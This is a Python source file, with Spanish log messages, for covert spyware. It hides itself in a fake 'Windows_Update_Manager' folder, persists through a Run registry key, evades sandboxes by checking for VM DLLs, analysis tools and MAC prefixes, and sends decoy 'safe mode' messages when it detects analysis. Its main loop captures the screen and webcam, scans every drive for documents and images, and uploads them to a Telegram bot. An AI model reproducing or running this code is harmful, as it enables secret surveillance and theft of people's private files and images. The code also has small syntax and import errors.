# -*- coding: utf-8 -*-
import cv2
import pyautogui
import time
import os
import shutil
import uuid
import hashlib
import requests
import winreg as reg
import logging
import psutil
import win32process
import win32api
import configparser
from pathlib import Path
from typing import Set, List
from win32con import PROCESS_QUERY_INFORMATION, PROCESS_VM_READ

logging.basicConfig(
    level=logging.ERROR,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='system_errors.log'
)

config = configparser.ConfigParser()
config.read('config.ini')

class ObfuscatedFileManager:
    
    @staticmethod
    def get_obfuscated_path(file_name: str) -> Path:
        try:
            if os.name == 'nt':
                base_dir = Path(os.getenv('APPDATA')) / "Windows_Update_Manager"
            else:
                base_dir = Path(os.getenv('HOME')) / ".cache/system_metrics"
            
            base_dir.mkdir(exist_ok=True, parents=True)
            
            hashed_name = hashlib.sha256(file_name.encode()).hexdigest()[:12]
            return base_dir / f"{hashed_name}.tmp"
            
        except Exception as e:
            logging.error(f"Error generando ruta ofuscada: {e}")
            return Path(file_name)

class AntiSandbox:
    
    SANDBOX_DLLS = {
        "sbiedll.dll", "api_log.dll", "dir_watch.dll",
        "pstorec.dll", "vmcheck.dll", "wpespy.dll"
    }
    
    SANDBOX_PROCESSES = {
        "vmsrvc", "tcpview", "wireshark", "fiddler",
        "vbox", "procmon", "vboxtray", "vmrawdsk",
        "xenservice", "qemu-ga", "vmtoolsd"
    }

    @classmethod
    def check_environment(cls) -> bool:
        return (
            cls._check_dlls() and
            cls._check_processes() and
            cls._check_hardware() and
            cls._check_network()
        )

    @classmethod
    def _check_dlls(cls) -> bool:
        try:
            for pid in win32process.EnumProcesses():
                try:
                    h_process = win32api.OpenProcess(
                        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid
                    )
                    modules = win32process.EnumProcessModules(h_process)
                    for module in modules:
                        dll_name = Path(
                            win32process.GetModuleFileNameEx(h_process, module)
                        ).name.lower()
                        if dll_name in cls.SANDBOX_DLLS:
                            return False
                finally:
                    win32api.CloseHandle(h_process)
            return True
        except Exception as e:
            logging.error(f"Error verificando DLLs: {e}")
            return True

    @classmethod
    def _check_processes(cls) -> bool:
        try:
            for proc in psutil.process_iter(['name']):
                proc_name = proc.info['name'].lower()
                if any(sandbox_proc in proc_name for sandbox_proc in cls.SANDBOX_PROCESSES):
                    return False
            return True
        except Exception as e:
            logging.error(f"Error verificando procesos: {e}")
            return True

    @classmethod
    def _check_hardware(cls) -> bool:
        try:
            if psutil.virtual_memory().total < 2 * 1024**3:
                return False
                

            if psutil.cpu_count() < 2:
                return False
                
            return True
        except Exception as e:
            logging.error(f"Error verificando hardware: {e}")
            return True

    @classmethod
    def _check_network(cls) -> bool:
        try:

            mac_vendors = ["00:05:69", "00:0C:29", "00:1C:14"]
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.address.lower().startswith(tuple(mac_vendors)):
                        return False
            return True
        except Exception as e:
            logging.error(f"Error verificando red: {e}")
            return True

class TelegramBot:
    
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.session = requests.Session()
        self.base_url = f"https://api.telegram.org/bot{self.token}"
        self.last_activity = time.time()

    def _generate_fake_activity(self):
        fake_messages = [
            "Sistema operativo actualizado correctamente",
            "Escaneo de seguridad completado: 0 amenazas",
            "Copia de seguridad realizada con éxito"
        ]
        for msg in fake_messages:
            self._send_request(msg)
            time.sleep(1)

    def _send_request(self, message: str, file_path: Path = None) -> bool:
        """Maneja el envío con reintentos y ofuscación"""
        try:
            if file_path and file_path.stat().st_size > 50 * 1024 * 1024:
                logging.warning("Archivo demasiado grande, omitiendo")
                return False

            params = {"chat_id": self.chat_id, "text": message}
            
            if file_path:
                with file_path.open('rb') as f:
                    files = {'document': f}
                    response = self.session.post(
                        f"{self.base_url}/sendDocument",
                        data=params,
                        files=files,
                        timeout=30
                    )
            else:
                response = self.session.get(
                    f"{self.base_url}/sendMessage",
                    params=params,
                    timeout=15
                )

            if response.status_code == 429:
                retry_after = response.headers.get('Retry-After', 60)
                time.sleep(int(retry_after))
                return self._send_request(message, file_path)
                
            response.raise_for_status()
            return True
            
        except Exception as e:
            logging.error(f"Error en comunicación Telegram: {e}")
            self._generate_fake_activity()
            return False

class SystemMonitor:    
    def __init__(self):
        self.token = config.get('Telegram', 'Token', fallback=os.getenv('TELEGRAM_TOKEN'))
        self.chat_id = config.get('Telegram', 'ChatID', fallback=os.getenv('TELEGRAM_CHAT_ID'))
        self.bot = TelegramBot(self.token, self.chat_id)
        self.archivo_hashes = ObfuscatedFileManager.get_obfuscated_path("hashes")
        self.hashes_enviados = self._load_hashes()
        self.directorio_oculto = self._create_hidden_dir()
        self._setup_autostart()

    def _load_hashes(self) -> Set[str]:
        try:
            return set(self.archivo_hashes.read_text().splitlines())
        except Exception as e:
            logging.error(f"Error cargando hashes: {e}")
            return set()

    def _create_hidden_dir(self) -> Path:
        dir_name = f".system_{uuid.uuid4().hex[:8]}" if os.name != 'nt' else f"SysCache_{uuid.uuid4().hex[:8]}"
        hidden_dir = Path(os.getenv('APPDATA' if os.name == 'nt' else 'HOME')) / dir_name
        hidden_dir.mkdir(exist_ok=True, parents=True)
        
        if os.name == 'nt':
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(str(hidden_dir), 2)
            
        return hidden_dir

    def _setup_autostart(self):
        if os.name != 'nt':
            return
            
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE) as key:
                reg.SetValueEx(
                    key,
                    "WindowsSystemMonitor",
                    0,
                    reg.REG_SZ,
                    f'"{sys.executable}" "{os.path.abspath(__file__)}"'
                )
        except Exception as e:
            logging.error(f"Error configurando autoinicio: {e}")

    def _capture_media(self):
        try:
            screenshot = pyautogui.screenshot()
            screenshot_path = self.directorio_oculto / f"screen_{int(time.time())}.png"
            screenshot.save(screenshot_path)
            self.bot._send_request("Captura de pantalla realizada", screenshot_path)


            cap = cv2.VideoCapture(0)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    cam_path = self.directorio_oculto / f"cam_{int(time.time())}.jpg"
                    cv2.imwrite(str(cam_path), frame)
                    self.bot._send_request("Captura de cámara realizada", cam_path)
                cap.release()
        except Exception as e:
            logging.error(f"Error capturando multimedia: {e}")

    def _scan_files(self):
        try:
            for disk in psutil.disk_partitions():
                if 'cdrom' in disk.opts or disk.fstype == '':
                    continue
                    
                for root, _, files in os.walk(disk.mountpoint):
                    for file in files:
                        file_path = Path(root) / file
                        if self._is_relevant_file(file_path):
                            self._process_file(file_path)
        except Exception as e:
            logging.error(f"Error escaneando archivos: {e}")

    def _is_relevant_file(self, file_path: Path) -> bool
        valid_exts = {'.jpg', '.jpeg', '.png', '.pdf', '.docx', '.xlsx', '.txt'}
        banned_keywords = {'backup', 'temp', 'test', 'example', 'ReadMe'}
        
        return (
            file_path.suffix.lower() in valid_exts and
            not any(kw in file_path.name.lower() for kw in banned_keywords) and
            file_path.stat().st_size < 25 * 1024 * 1024
        )

    def _process_file(self, file_path: Path):
    
        try:
            file_hash = self._calculate_hash(file_path)
            
            if file_hash not in self.hashes_enviados:
                if self.bot._send_request(f"Nuevo archivo: {file_path.name}", file_path):
                    self._save_hash(file_hash)
        except Exception as e:
            logging.error(f"Error procesando archivo {file_path}: {e}")

    def _calculate_hash(self, file_path: Path) -> str:
    
        sha256 = hashlib.sha256()
        with file_path.open('rb') as f:
            while chunk := f.read(8192):
                sha256.update(chunk)
        return sha256.hexdigest()

    def _save_hash(self, file_hash: str):
        try:
            with self.archivo_hashes.open('a') as f:
                f.write(f"{file_hash}\n")
            self.hashes_enviados.add(file_hash)
        except Exception as e:
            logging.error(f"Error guardando hash: {e}")

    def _safe_mode_operation(self):
        fake_data = [
            ("system_logs.zip", "Registros del sistema comprimidos"),
            ("error_report.txt", "Reporte de errores críticos"),
            ("network_traffic.pcap", "Captura de tráfico de red")
        ]
        
        for filename, description in fake_data:
            fake_file = self.directorio_oculto / filename
            fake_file.touch()
            self.bot._send_request(f"⚠️ {description}", fake_file)
            time.sleep(1)
            
        self.bot._send_request("🔒 Modo seguro activado: Sistema estable")

    def run(self):
    
        if not AntiSandbox.check_environment():
            logging.warning("Entorno sospechoso detectado. Activando modo seguro.")
            self._safe_mode_operation()
            return

        try:
            while True:
                self._capture_media()
                self._scan_files()
                time.sleep(config.getint('Configuracion', 'Intervalo', fallback=300))
        except KeyboardInterrupt:
            logging.info("Interrupción de usuario recibida. Saliendo...")
        except Exception as e:
            logging.critical(f"Error crítico: {e}")
            self.bot._send_request(f"🚨 Error crítico: {str(e)[:50]}")

if __name__ == "__main__":
    monitor = SystemMonitor()
    monitor.run()
